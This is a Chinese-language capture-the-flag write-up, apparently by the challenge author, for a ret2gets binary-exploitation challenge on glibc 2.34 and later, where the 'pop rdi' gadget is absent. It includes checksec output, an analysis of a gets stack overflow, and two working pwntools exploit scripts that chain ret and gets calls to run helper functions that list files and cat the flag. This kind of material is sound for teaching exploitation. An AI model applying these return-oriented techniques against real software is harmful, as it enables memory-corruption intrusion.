# UniCTF - Sur prize

感觉我出的这道才是真的入门题……还是水平不够，别的大佬出的题太厉害了。

简单的 ret2gets，因为在高版本 libc 下（glibc 2.34 +），引入了一个 patch 将 `__libc_csu_init` 从二进制文件中移除了，所以此时我们心爱的 `pop rdi ; ret` gadget 就不见了（但经过出题人实测，仅 gcc 编译的二进制文件没有 `pop rdi ; ret`，clang 的编译产物还是有这个 gadget 的，具体原因没有细究，有兴趣的可以去自己研究一下不同编译器不同参数下的代码优化策略和具体行为）。

---

## 分析

拿到二进制文件直接分析，

```bash
❯ checksec vuln
[*] '/home/neptune/unictf/Sur prize/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

可以看见没开 PIE 和 canary，也没去符号表，所以非常简单。IDA 分析逻辑，很清楚可以看到前面先运行了一坨不知道干什么的代码，这里其实是出题人的恶趣味，只要按任意键就可以结束并进入 `_main` 函数的逻辑。看到一个非常大的 gets，直接栈溢出，不过查看汇编可以发现对栈进行了各种操作，本地动调一下，发现 offset 为 0，直接开始写 payload 即可。给了两个函数，`wutihave` 和 `leimicc`，前者调用 `ls`，可以查看靶机文件，因为这里出题人想利用 ret2gets 的一个特性，所以远程靶机的 flag 文件名并不是简单的 flag，后者是调用 cat，将文件名作为参数传入即可。

---

## exp

需要打两次，第一次调用 `wutihave`，第二次根据远程的文件名调用 `leimicc` 获取 flag

```python
from pwn import *

context.log_level = "debug"

context.binary = elf = ELF("./vuln")
io = elf.process()
# io = remote("localhost", 9999)

rop = ROP(elf)

io.sendline()

payload = p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.wutihave)

io.sendline(payload)
io.sendline(b"")
io.sendline(b"")

io.interactive()
```

第二次获取 flag

```python
from pwn import *

context.log_level = "debug"

context.binary = elf = ELF("./vuln")
io = elf.process()
# io = remote("localhost", 9999)

rop = ROP(elf)

io.sendline()

payload = p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.leimicc)

io.sendline(payload)
io.sendline(b"")
io.sendline(b"flag`xxx")

io.interactive()
```

远程 flag 文件其实是 flag_xxx，但是 ret2gets 特性，传参控制 `rdi` 的参数第五个字符要 -1，这里变为反引号。

原理不再详细解释，可以自行查看网上对 ret2gets 技术的介绍，文章非常多。
